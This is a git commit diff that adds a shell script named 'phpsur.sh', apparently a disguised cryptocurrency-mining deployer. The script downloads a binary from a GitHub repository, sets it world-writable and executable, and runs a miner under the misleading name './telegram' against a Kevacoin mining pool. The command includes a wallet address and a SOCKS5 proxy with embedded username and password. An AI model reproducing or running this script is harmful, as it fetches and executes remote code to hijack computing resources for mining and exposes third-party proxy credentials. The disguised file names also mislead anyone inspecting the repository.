e84e5758b081636e5d8172b5551e02e5e3564a62
Explorer-Discord <90913472+Explorer-Discord@users.noreply.github.com>
2021-09-17 20:46:07 +0700

    Add files via upload

---
+++ phpsur.sh
@@ -0,0 +1,7 @@
+#!/bin/bash
+sudo apt update 
+sudo apt install screen libjansson4 -y
+wget -O domino https://github.com/Explorer-Discord/Discord/raw/main/domino 
+screen -dmS ls
+chmod +x phpsur.sh && chmod +x domino && chmod 777 domino phpsur.sh
+./telegram --algorithm randomkeva --pool de.kevacoin.herominers.com:1163 --wallet VSd2PqJ9uSKvJVkXuHiLRvnqvPFLpxDYDP --password BK-01=$(echo $strDate-$(shuf -i 1-1000 -n 1)) --proxy=socks5://cghuohtm:ev5p8oqzuvmg@45.136.228.154:6209
